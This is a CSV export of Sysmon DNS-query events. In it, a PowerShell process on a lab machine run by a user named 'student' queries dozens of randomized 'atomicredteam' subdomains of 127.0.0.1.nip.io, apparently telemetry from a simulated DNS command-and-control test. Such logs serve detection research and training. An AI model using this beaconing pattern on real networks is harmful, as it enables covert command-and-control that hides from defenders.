"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174147,"Query: atomicredteam-499900.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.428","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174148,"Query: atomicredteam-714421.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.468","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174149,"Query: atomicredteam-28085.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.508","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174150,"Query: atomicredteam-604174.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.549","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174151,"Query: atomicredteam-410950.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.718","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.393 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174152,"Query: atomicredteam-112988.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.758","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.393 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174153,"Query: atomicredteam-130208.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.798","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.393 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174154,"Query: atomicredteam-643495.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.838","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.393 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174155,"Query: atomicredteam-189679.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.877","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.393 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174156,"Query: atomicredteam-186250.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.916","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.393 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174157,"Query: atomicredteam-802044.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.955","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.160 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174158,"Query: atomicredteam-483382.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.127","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.160 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174159,"Query: atomicredteam-1141.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.189","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.160 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174160,"Query: atomicredteam-19797.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.230","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.160 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174161,"Query: atomicredteam-187398.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.413","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.160 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174162,"Query: atomicredteam-372863.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.456","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.160 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174163,"Query: atomicredteam-880384.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.496","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.160 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174164,"Query: atomicredteam-86154.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.536","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.161 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174165,"Query: atomicredteam-478761.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.577","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.161 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174166,"Query: atomicredteam-389832.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.757","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.161 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174167,"Query: atomicredteam-358347.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.797","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.161 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174168,"Query: atomicredteam-696241.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.837","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:47.161 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174169,"Query: atomicredteam-976134.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.878","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174170,"Query: atomicredteam-674421.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:46.917","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174171,"Query: atomicredteam-277523.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.245","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174172,"Query: atomicredteam-866303.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.284","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174173,"Query: atomicredteam-585757.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.324","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174174,"Query: atomicredteam-737637.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.365","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174175,"Query: atomicredteam-734625.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.406","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174176,"Query: atomicredteam-289416.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.445","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174177,"Query: atomicredteam-199135.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.486","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174178,"Query: atomicredteam-876291.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.526","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174179,"Query: atomicredteam-575776.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.567","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174180,"Query: atomicredteam-286517.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.743","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174181,"Query: atomicredteam-987050.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.783","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174182,"Query: atomicredteam-790758.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.824","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174183,"Query: atomicredteam-580986.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.864","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174184,"Query: atomicredteam-59409.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.906","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174185,"Query: atomicredteam-150472.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.947","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:48.163 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174186,"Query: atomicredteam-835555.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:47.987","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174187,"Query: atomicredteam-23737.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.162","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174188,"Query: atomicredteam-111107.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.201","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174189,"Query: atomicredteam-480722.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.241","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174190,"Query: atomicredteam-351637.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.280","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174191,"Query: atomicredteam-687575.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.607","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174192,"Query: atomicredteam-334802.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.646","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174193,"Query: atomicredteam-297906.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.686","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174194,"Query: atomicredteam-718085.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.726","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
